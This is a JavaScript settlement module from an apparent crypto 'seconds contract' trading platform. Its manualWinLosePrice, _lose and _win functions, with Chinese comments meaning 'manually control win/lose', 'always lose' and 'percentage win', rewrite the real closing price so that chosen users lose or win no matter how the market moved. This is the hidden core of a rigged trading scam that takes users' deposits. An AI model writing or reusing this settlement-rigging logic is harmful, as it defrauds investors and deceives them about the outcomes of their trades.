// const utils99 = require('node-utils99')
// const config = require('../../config/all.js');
// const { db } = require('../../lib/db.setup.js')
const service_currency_contract_sec = require('./currency_contract_sec.js')
const service_member_wallet = require('./wallet.js')
const service_member = require('./member.js')

let _t = {
    async check(id, price_pay) {
        const item = await service_currency_contract_sec.oneById(id)
        if (item.status == 0) {
            return { flag: 'ok', 'msg': '已平仓' }
        }

        price_pay = await _t.manualWinLosePrice(item, price_pay)
        price_pay = Math.round(price_pay * 10000) / 10000
        console.log('check pricePay', price_pay)

        const status = 0 // 平仓状态
        if (item.action == 'long') {
            if (price_pay > item.price_buy) {
                // 用户 赢，给本金加利润
                await service_currency_contract_sec.updateById(item.id, item.amount_buy * (item.rate / 100), price_pay, status)
                await service_member_wallet.updateContractAmountAction(item.user_id, 'usdt', item.amount_buy + (item.amount_buy * (item.rate / 100)), '+')
            } else if (price_pay < item.price_buy) {
                // 用户 输，不做任何处理
                await service_currency_contract_sec.updateById(item.id, -item.amount_buy, price_pay, status)
            } else {
                // 用户 平，退本金
                await service_currency_contract_sec.updateById(item.id, 0, price_pay, status)
                await service_member_wallet.updateContractAmountAction(item.user_id, 'usdt', item.amount_buy, '+')
            }
        }
        else if (item.action == 'short') {
            if (price_pay < item.price_buy) {
                // 用户 赢，给本金加利润
                await service_currency_contract_sec.updateById(item.id, item.amount_buy * (item.rate / 100), price_pay, status)
                await service_member_wallet.updateContractAmountAction(item.user_id, 'usdt', item.amount_buy + (item.amount_buy * (item.rate / 100)), '+')
            } else if (price_pay > item.price_buy) {
                // 用户 输，不做任何处理
                await service_currency_contract_sec.updateById(item.id, -item.amount_buy, price_pay, status)
            } else {
                // 用户 平，退本金
                await service_currency_contract_sec.updateById(item.id, 0, price_pay, status)
                await service_member_wallet.updateContractAmountAction(item.user_id, 'usdt', item.amount_buy, '+')
            }
        } else {
            return { flag: 'data exception!' }
        }

        return { flag: 'ok' }
    },

    // 手动控制 输赢
    async manualWinLosePrice(orderItem, pricePay) {
        let action = orderItem.action
        // 手动处理 优先
        if (orderItem.manual == 1) {
            // 要用户 输
            return _t._lose(action, orderItem, pricePay)
        } else if (orderItem.manual == 2) {
            // 要用户 赢
            return _t._win(action, orderItem, pricePay)
        } else {
            // 用户属性
            let memberItem = await service_member.oneById(orderItem.user_id)
            if (memberItem.contract_sec_percent == -1) {
                // 永输
                return _t._lose(action, orderItem, pricePay)
            } else if (memberItem.contract_sec_percent == -2) {
                // 永赢
                return _t._win(action, orderItem, pricePay)
            } else if (memberItem.contract_sec_percent > 0) {
                // 百分比赢
                let p = memberItem.contract_sec_percent
                let r = Math.floor(Math.random() * 100)
                return (p >= r) ? _t._win(action, orderItem, pricePay) : _t._lose(action, orderItem, pricePay)
            }
        }
        console.log('manualWinLosePrice pricePay', pricePay)
        return pricePay
    },

    _lose(action, item, pricePay) {
        if (action == 'long') {
            // 行情涨了，用户赢。但强制要输。
            if (item.price_buy < pricePay || item.price_buy == pricePay) {
                pricePay = item.price_buy - (Math.random() * 2)
            }
        } else if (action == 'short') {
            // 行情跌了，用户赢。但强制要输。
            if (item.price_buy > pricePay || item.price_buy == pricePay) {
                pricePay = item.price_buy + (Math.random() * 2)
            }
        }
        console.log('lose pricePay', pricePay)
        return pricePay
    },
    _win(action, item, pricePay) {
        if (action == 'long') {
            // 行情跌了，用户输。但强制要赢。
            if (item.price_buy > pricePay || item.price_buy == pricePay) {
                pricePay = item.price_buy + (Math.random() * 2)
            }
        } else if (action == 'short') {
            // 行情涨了，用户输。但强制要赢。
            if (item.price_buy < pricePay || item.price_buy == pricePay) {
                pricePay = item.price_buy - (Math.random() * 2)
            }
        }
        console.log('win pricePay', pricePay)
        return pricePay
    },
}

module.exports = _t